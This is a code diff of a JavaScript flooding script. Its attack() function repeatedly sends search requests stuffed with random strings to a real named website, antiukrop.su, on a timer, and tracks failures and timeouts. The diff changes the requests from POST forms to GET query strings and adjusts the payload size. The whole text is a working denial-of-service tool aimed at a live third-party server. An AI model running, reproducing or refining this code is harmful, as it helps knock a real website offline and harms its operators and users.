@@ -20,15 +20,19 @@ setInterval(function () {
 
 function generate() {
   const chucks = [];
-  for (let i = 0; i < _.random(1, 2000); i++) {
+  for (let i = 0; i < _.random(1, 10); i++) {
     chucks.push(_.random(1, Number.MAX_SAFE_INTEGER).toString(36))
   }
   return chucks.join(' ');
 }
 
 function attack() {
-  const options = {form: {search_api_views_fulltext: generate(), headers: headers}}
-  request.post('http://antiukrop.su/search', options, function (err, res) {
+  const options = {headers: headers};
+  const data = qs.encode({
+    search_api_views_fulltext: generate()
+  });
+  const _url = 'http://antiukrop.su/search?' + data;
+  request(_url, options, function (err, res) {
     count++;
     if (err || 200 !== res.statusCode) {
       if ('ETIMEDOUT' === err.code) {
